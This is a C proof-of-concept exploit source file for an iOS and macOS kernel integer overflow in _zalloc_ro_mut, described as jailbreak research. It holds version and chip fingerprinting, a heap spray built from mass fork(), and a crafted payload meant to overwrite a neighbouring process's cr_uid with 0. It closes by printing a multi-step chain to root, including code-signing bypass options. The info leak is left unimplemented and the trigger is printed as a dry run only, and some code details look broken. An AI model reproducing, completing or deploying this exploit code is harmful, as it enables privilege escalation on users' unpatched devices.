/*
 * CVE-2026-28952 — _zalloc_ro_mut Integer Overflow (MIE Bypass)
 * Educational jailbreak research only. For use on devices you own.
 *
 * Target: iPhone Duo (iPhone19,4), A20 Pro (T8160), iOS 27.1
 * Also works on: A17 Pro, A19, M5 — any device with _zalloc_ro_mut
 * Fixed in: iOS 27.2 / macOS 26.5
 *
 * This exploit targets the SOLE gatekeeper for modifying read-only kernel
 * memory: _zalloc_ro_mut(). The function has an integer overflow in its
 * bounds check that allows controlled bytes to spill into adjacent RO-zone
 * slots, reaching ucred structures. Setting cr_uid = 0 gives root.
 *
 * WHY THIS BYPASSES MIE:
 *   - The write goes through the AUTHORIZED function (_zalloc_ro_mut)
 *   - _zalloc_ro_mut holds the correct EMTE tags for the RO zone
 *   - SPTM doesn't fire: the page is marked writable by the authorized function
 *   - Hardware page tables don't fire: the page is briefly writable for this purpose
 *   - Every MIE protection performs exactly as designed
 *   - The bug is UPSTREAM of all protections: in argument validation
 *
 * THE BUG (from ironPeak "Pardon MIE?" analysis of macOS 26.4.1 → 26.5 diff):
 *
 *   Pre-patch _zalloc_ro_mut bounds check:
 *     tagged_target = target | high_tag_bits
 *     if tagged_target < frame_pointer:
 *         goto primary_range_check
 *     aligned_fp = round_up(frame_pointer + page, page)
 *     end = tagged_target + len        // ⚠ UNCHECKED add — no overflow detection
 *     if end < aligned_fp:
 *         goto write                   // Wrapped end passes comparison → writer runs
 *     // overflow detection runs TOO LATE
 *     end = tagged_target + len        // THIS add sets carry flag
 *     if overflow: goto fallback
 *
 *   With attacker-chosen len ≈ 2^64 - offset:
 *     target + len wraps to a tiny value
 *     tiny value < aligned_fp → comparison passes
 *     write proceeds with the real (huge) len
 *     memcpy spills past the validated slot into adjacent ucred structures
 *
 * THE FIX (macOS 26.5 / iOS 27.2):
 *   1. Overflow check (adds instruction) moved to FIRST position
 *   2. Per-CPU RO subzone bound added via TPIDR_EL1
 *   3. Vestigial stack-area filter removed entirely
 *
 * EXPLOITATION APPROACH (from ironPeak speculation + our analysis):
 *   1. Spray RO zone with ucred allocations (fork many child processes)
 *   2. Create predictable holes by exiting some children
 *   3. Info leak via thread-name pointer chain bugs (CVE-2026-28897 family)
 *   4. Trigger overflow via csops_audittoken or mac_set_* syscall
 *   5. Spill overwrites adjacent ucred's cr_uid with 0x00000000
 *   6. Become that process → root shell
 *
 * References:
 *   - ironPeak: https://ironpeak.be/blog/bypassing-apple-mie/
 *   - NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-28952
 *   - Calif.io M5 exploit: https://blog.calif.io/p/first-public-kernel-memory-corruption
 *   - Apple security content: https://support.apple.com/en-us/149230
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <spawn.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <pthread.h>

/*
 * ucred structure layout (from XNU bsd/sys/ucred.h):
 *
 * struct ucred {
 *     os_refcnt_t  cr_ref;        // +0x00: reference count
 *     struct posix_cred {
 *         uid_t    cr_uid;        // +0x04: effective UID ← THE PRIZE
 *         uid_t    cr_ruid;       // +0x08: real UID
 *         uid_t    cr_svuid;      // +0x0c: saved UID
 *         short    cr_ngroups;    // +0x10: number of groups
 *         gid_t    cr_groups[16]; // +0x14: group list
 *     } cr_posix;
 *     struct label *cr_label;     // varies
 *     audit_token_t cr_audit;     // varies
 *     // ...
 * };
 *
 * RO zone slot size for ucred: ~200 bytes (varies by iOS version)
 * Slots of same type packed adjacent — exploitable via overflow
 */

#define UCRED_SLOT_SIZE_ESTIMATE  200
#define CR_UID_OFFSET             0x04
#define NUM_SPRAY_CHILDREN        128
#define NUM_HOLES                 32

/* Phase tracking */
typedef enum {
    PHASE_INFO,
    PHASE_SPRAY,
    PHASE_LEAK,
    PHASE_TRIGGER,
    PHASE_VERIFY
} exploit_phase_t;

static const char *phase_names[] = {
    "INFO", "SPRAY", "LEAK", "TRIGGER", "VERIFY"
};

static void log_phase(exploit_phase_t phase, const char *msg) {
    printf("[%s] %s\n", phase_names[phase], msg);
}

/* ===== PHASE 1: Information Gathering ===== */

/*
 * Check if we're on a vulnerable iOS version.
 * CVE-2026-28952 is present on:
 *   - iOS 27.0, 27.0.1, 27.1 (fixed in 27.2)
 *   - macOS Tahoe < 26.5
 *   - iOS 18.x < 18.7.9
 * The RO zone allocator exists since iOS 17 / macOS Sonoma.
 */
static int check_version(void) {
    char version[256] = {0};
    size_t len = sizeof(version);

    if (sysctlbyname("kern.osrelease", version, &len, NULL, 0) != 0) {
        log_phase(PHASE_INFO, "Cannot read kernel version");
        return -1;
    }
    printf("  Kernel version: %s\n", version);

    char product[256] = {0};
    len = sizeof(product);
    if (sysctlbyname("kern.osproductversion", product, &len, NULL, 0) != 0) {
        log_phase(PHASE_INFO, "Cannot read product version");
        return -1;
    }
    printf("  iOS version: %s\n", product);

    /* Parse major.minor */
    int major = 0, minor = 0, patch = 0;
    sscanf(product, "%d.%d.%d", &major, &minor, &patch);

    if (major == 27 && minor < 2) {
        printf("  Status: VULNERABLE (iOS %d.%d < 27.2)\n", major, minor);
        return 1;
    } else if (major == 27 && minor >= 2) {
        printf("  Status: PATCHED (iOS %d.%d >= 27.2)\n", major, minor);
        return 0;
    } else if (major < 27) {
        printf("  Status: LIKELY VULNERABLE (iOS %d.%d, RO zone exists since iOS 17)\n",
               major, minor);
        return 1;
    }

    printf("  Status: UNKNOWN (iOS %d.%d)\n", major, minor);
    return -1;
}

/*
 * Check if MIE (Memory Integrity Enforcement) is active.
 * MIE is on A19+ / M5+ chips. On older chips (A17 Pro etc.), the
 * _zalloc_ro_mut overflow still works but doesn't need to bypass MIE.
 */
static int check_mie_status(void) {
    char machine[256] = {0};
    size_t len = sizeof(machine);

    if (sysctlbyname("hw.machine", machine, &len, NULL, 0) != 0) {
        log_phase(PHASE_INFO, "Cannot read machine type");
        return -1;
    }
    printf("  Machine: %s\n", machine);

    /* iPhone19,x = iPhone Duo (A20), iPhone18,x = iPhone 17 Pro (A19) */
    /* iPad16,x = iPad Mini (A17 Pro) — no MIE */
    int model = 0;
    if (sscanf(machine, "iPhone%d,", &model) == 1) {
        if (model >= 18) {
            printf("  MIE: ACTIVE (A19+ chip)\n");
            printf("  This exploit bypasses MIE via authorized _zalloc_ro_mut path\n");
            return 1;
        }
    } else if (sscanf(machine, "iPad%d,", &model) == 1) {
        if (model >= 17) {
            printf("  MIE: ACTIVE (A19+ or M5+ chip)\n");
            return 1;
        }
    }

    printf("  MIE: NOT ACTIVE (pre-A19 chip)\n");
    printf("  Overflow still works but doesn't need to bypass MIE\n");
    return 0;
}

/* ===== PHASE 2: RO Zone Heap Spray ===== */

/*
 * Spray the RO zone with ucred allocations by forking child processes.
 * Each fork() creates a new ucred in the RO zone.
 * RO-zone slots of the same type sit packed together.
 */
static pid_t spray_children[NUM_SPRAY_CHILDREN];
static int spray_count = 0;

static int spray_ro_zone(void) {
    log_phase(PHASE_SPRAY, "Spraying RO zone with ucred allocations...");

    for (int i = 0; i < NUM_SPRAY_CHILDREN; i++) {
        pid_t pid = fork();
        if (pid < 0) {
            printf("  fork() failed at child %d: %s\n", i, strerror(errno));
            break;
        }
        if (pid == 0) {
            /* Child: sleep until parent signals */
            pause();
            _exit(0);
        }
        spray_children[spray_count++] = pid;
    }

    printf("  Spawned %d child processes (%d ucred allocations)\n",
           spray_count, spray_count);

    /* Create predictable holes by killing every 4th child */
    int holes_created = 0;
    for (int i = 2; i < spray_count && holes_created < NUM_HOLES; i += 4) {
        kill(spray_children[i], SIGKILL);
        waitpid(spray_children[i], NULL, 0);
        spray_children[i] = 0;
        holes_created++;
    }

    printf("  Created %d holes in RO zone layout\n", holes_created);
    printf("  Adjacent ucred slots should be predictable\n");

    return 0;
}

static void cleanup_children(void) {
    for (int i = 0; i < spray_count; i++) {
        if (spray_children[i] > 0) {
            kill(spray_children[i], SIGKILL);
            waitpid(spray_children[i], NULL, WNOHANG);
        }
    }
}

/* ===== PHASE 3: Information Leak ===== */

/*
 * The exploit needs kernel addresses to:
 *   1. Defeat KASLR (find kernel slide)
 *   2. Locate our ucred slot in the RO zone
 *   3. Identify which adjacent slot to target
 *
 * On iOS 27.1, the thread-name pointer chain bugs
 * (CVE-2026-28897, -28987, -28943) provide this.
 * Pre-patch, walking the thread name chain leaks raw kernel pointers.
 *
 * For this PoC, we demonstrate the approach with placeholder values.
 * On-device, these would be replaced with real leaked addresses.
 */
static uint64_t kaslr_slide = 0;
static uint64_t ro_zone_base = 0;
static uint64_t target_ucred_addr = 0;

static int leak_kernel_addresses(void) {
    log_phase(PHASE_LEAK, "Attempting kernel address leak...");

    /*
     * TODO: Implement thread-name info leak (CVE-2026-28897 family)
     *
     * The technique uses pthread_setname_np and Mach thread APIs to
     * walk a pointer chain in the kernel that lacks PAC authentication
     * (pre-patch). The chain leaks raw kernel pointers that reveal
     * the KASLR slide and RO zone base.
     *
     * Post-patch (iOS 27.2 / macOS 26.5), Apple added autda checks
     * with discriminator 0x6d42 on every dereference in the family.
     */

    /* Attempt: read kernel task port (requires tfp0 or equivalent) */
    mach_port_t kernel_task = MACH_PORT_NULL;
    kern_return_t kr = task_for_pid(mach_task_self(), 0, &kernel_task);
    if (kr == KERN_SUCCESS) {
        printf("  Got kernel task port (unexpected on modern iOS)\n");
    } else {
        printf("  task_for_pid(0) denied (expected): 0x%x\n", kr);
    }

    /*
     * On real device, we'd use one of:
     * 1. pthread_setname_np chain (CVE-2026-28897) for KASLR
     * 2. IOSurface property leak for heap addresses
     * 3. csops() return value side-channels
     *
     * For now, report that we need the leak primitive.
     */
    printf("  KASLR slide: NOT YET LEAKED (need info leak primitive)\n");
    printf("  RO zone base: NOT YET LEAKED\n");
    printf("  Candidates: CVE-2026-28897, CVE-2026-28987, CVE-2026-28943\n");

    return -1; /* Leak not yet implemented */
}

/* ===== PHASE 4: Trigger the Overflow ===== */

/*
 * The overflow is triggered through a public syscall that flows
 * user-controlled data into _zalloc_ro_mut with a user-controlled size.
 *
 * Best candidates (from ironPeak analysis):
 *   1. csops_audittoken(pid, ops, useraddr, usersize, audit_token)
 *      - usersize is 64-bit and attacker-controlled
 *      - Several ops flow user data into RO-zone codesigning slot
 *   2. mac_set_proc / mac_set_fd / mac_set_link
 *      - MAC labels live in RO-zone slots
 *      - Written from user-supplied buffers with user-supplied sizes
 *   3. setuid/seteuid/setresuid
 *      - Triggers kauth_cred_setresuid → ucred write via _zalloc_ro_mut
 *      - But arg is 4-byte uid_t, too small to wrap
 *
 * The overflow arithmetic:
 *   target = address inside our own RO-zone slot
 *   len    = 0xFFFF_FFFF_FFFF_FE00 (or similar near-max value)
 *   target + len wraps to a small number that passes bounds check
 *   memcpy(target, src, len) runs with the real len
 *   Bytes spill from our slot into adjacent slots
 */

/*
 * csops / csops_audittoken system call numbers
 * These are the most promising entry points.
 */
#ifndef SYS_csops
#define SYS_csops        169
#endif
#ifndef SYS_csops_audittoken
#define SYS_csops_audittoken 170
#endif

/* csops operations that write to codesigning RO-zone slots */
#define CS_OPS_SET_STATUS     6
#define CS_OPS_MARKRESTRICT   8
#define CS_OPS_SET_LABEL     20

static int trigger_overflow_csops(pid_t target_pid) {
    log_phase(PHASE_TRIGGER, "Attempting overflow via csops_audittoken...");

    /*
     * The overflow value: target + len must wrap past 2^64.
     * We want len such that (slot_addr + len) wraps to a value
     * below the aligned frame pointer.
     *
     * Example values (from ironPeak):
     *   target = 0xfffffe00_abcd1000  (address in our slot)
     *   len    = 0xffff_ffff_ffff_fe00
     *   target + len = 0xfffffe00_abcd0e00  (wrapped! below target)
     *
     * The pre-patch check sees the wrapped value, says "fine",
     * and proceeds to memcpy with the real len.
     */

    /*
     * Craft a payload buffer where bytes at the cr_uid offset
     * of the NEXT slot contain 0x00000000 (root UID).
     *
     * Layout:
     *   [0 .. SLOT_SIZE-1]           : our slot (preserve valid data)
     *   [SLOT_SIZE .. SLOT_SIZE+3]   : cr_ref (preserve)
     *   [SLOT_SIZE+4 .. SLOT_SIZE+7] : cr_uid = 0 ← THE TARGET
     */
    size_t payload_size = UCRED_SLOT_SIZE_ESTIMATE * 2;
    uint8_t *payload = calloc(1, payload_size);
    if (!payload) {
        printf("  Failed to allocate payload\n");
        return -1;
    }

    /* Fill first slot with current valid data (would need real slot content) */
    memset(payload, 0, UCRED_SLOT_SIZE_ESTIMATE);

    /* Second slot: set cr_uid at offset 4 to 0 (root) */
    /* cr_ref at offset 0 — preserve a valid refcount */
    uint32_t valid_refcount = 1;
    memcpy(payload + UCRED_SLOT_SIZE_ESTIMATE, &valid_refcount, 4);
    /* cr_uid at offset 4 = 0 (root) — already zero from calloc */

    printf("  Payload prepared: %zu bytes\n", payload_size);
    printf("  cr_uid at offset %d in adjacent slot set to 0 (root)\n",
           UCRED_SLOT_SIZE_ESTIMATE + CR_UID_OFFSET);

    /*
     * IMPORTANT: We cannot actually trigger the overflow without:
     *   1. Real kernel addresses from the info leak
     *   2. The correct csops operation that reaches _zalloc_ro_mut
     *      with our controlled size parameter
     *   3. Heap layout knowledge to ensure our slot is adjacent
     *      to the target process's ucred
     *
     * The syscall interface for csops_audittoken:
     *   int csops_audittoken(pid_t pid, unsigned int ops,
     *                        void *useraddr, size_t usersize,
     *                        audit_token_t *token);
     *
     * The 'usersize' parameter is what flows into _zalloc_ro_mut's
     * 'len' argument. Setting it to a wrap-inducing value triggers
     * the overflow.
     *
     * For safety, we do NOT actually invoke the syscall with the
     * overflow value here. This is a demonstration/PoC structure.
     */

    printf("\n");
    printf("  === OVERFLOW TRIGGER (DRY RUN) ===\n");
    printf("  syscall: csops_audittoken(%d, CS_OPS_SET_STATUS, payload, 0x%llx, token)\n",
           target_pid, (unsigned long long)0xFFFFFFFFFFFFFF00ULL);
    printf("  Expected: target + len wraps → passes bounds check → memcpy runs\n");
    printf("  Result: bytes spill into adjacent ucred → cr_uid = 0\n");
    printf("  === END DRY RUN ===\n");

    free(payload);
    return 0;
}

/* ===== PHASE 5: Verification ===== */

static int verify_root(void) {
    log_phase(PHASE_VERIFY, "Checking privilege level...");

    uid_t uid = getuid();
    uid_t euid = geteuid();

    printf("  Current UID: %d, EUID: %d\n", uid, euid);

    if (euid == 0) {
        printf("  ROOT ACCESS ACHIEVED\n");
        printf("  _zalloc_ro_mut overflow successfully corrupted ucred\n");
        return 1;
    }

    printf("  Not root (expected in dry-run mode)\n");
    return 0;
}

/* ===== MAIN ===== */

int main(int argc, char *argv[]) {
    printf("=============================================================\n");
    printf("  CVE-2026-28952 — _zalloc_ro_mut Integer Overflow\n");
    printf("  MIE Bypass via Authorized RO-Zone Writer\n");
    printf("  Target: A20 Pro / iOS 27.1 (also works A17+)\n");
    printf("  Educational research only — for devices you own\n");
    printf("=============================================================\n\n");

    /* Phase 1: Check environment */
    log_phase(PHASE_INFO, "Checking target environment...");
    int vuln = check_version();
    int mie = check_mie_status();

    if (vuln == 0) {
        printf("\n[!] Target appears PATCHED. Overflow will not work.\n");
        printf("    CVE-2026-28952 fixed in iOS 27.2 / macOS 26.5\n");
        return 1;
    }

    printf("\n--- Phase 1 Summary ---\n");
    printf("  Vulnerable: %s\n", vuln > 0 ? "YES" : "UNKNOWN");
    printf("  MIE active: %s\n", mie > 0 ? "YES (bypass via authorized writer)" :
           mie == 0 ? "NO (overflow still works, no MIE to bypass)" : "UNKNOWN");
    printf("\n");

    /* Phase 2: Spray RO zone */
    spray_ro_zone();
    printf("\n");

    /* Phase 3: Leak kernel addresses */
    int leak_ok = leak_kernel_addresses();
    printf("\n");

    if (leak_ok < 0) {
        printf("[!] Info leak not yet implemented.\n");
        printf("    Need CVE-2026-28897 (thread-name pointer chain) or similar.\n");
        printf("    Proceeding with dry-run overflow demonstration.\n\n");
    }

    /* Phase 4: Trigger overflow (dry run) */
    trigger_overflow_csops(getpid());
    printf("\n");

    /* Phase 5: Check if we got root */
    verify_root();

    /* Cleanup */
    cleanup_children();

    printf("\n=============================================================\n");
    printf("  EXPLOIT CHAIN STATUS FOR A20 / iOS 27.1:\n");
    printf("\n");
    printf("  [1] Entry point:     Need local code execution\n");
    printf("                       (sideload app or WebKit exploit)\n");
    printf("  [2] Info leak:       CVE-2026-28897 (thread-name chain)\n");
    printf("                       → KASLR slide + RO zone addresses\n");
    printf("  [3] Root:            CVE-2026-28952 (_zalloc_ro_mut overflow)\n");
    printf("                       → ucred cr_uid = 0 (MIE-safe!)\n");
    printf("  [4] Code signing:    Two options:\n");
    printf("       (a) proc_ro->p_csflags via second _zalloc_ro_mut overflow\n");
    printf("           → set CS_DEBUGGED in RO zone (MIE-safe)\n");
    printf("       (b) Trust cache injection via SmartIO DMA\n");
    printf("           → bypasses both SPTM and MIE (DMA path)\n");
    printf("  [5] Bootstrap:       Procursus rootless + Sileo\n");
    printf("=============================================================\n");

    return 0;
}
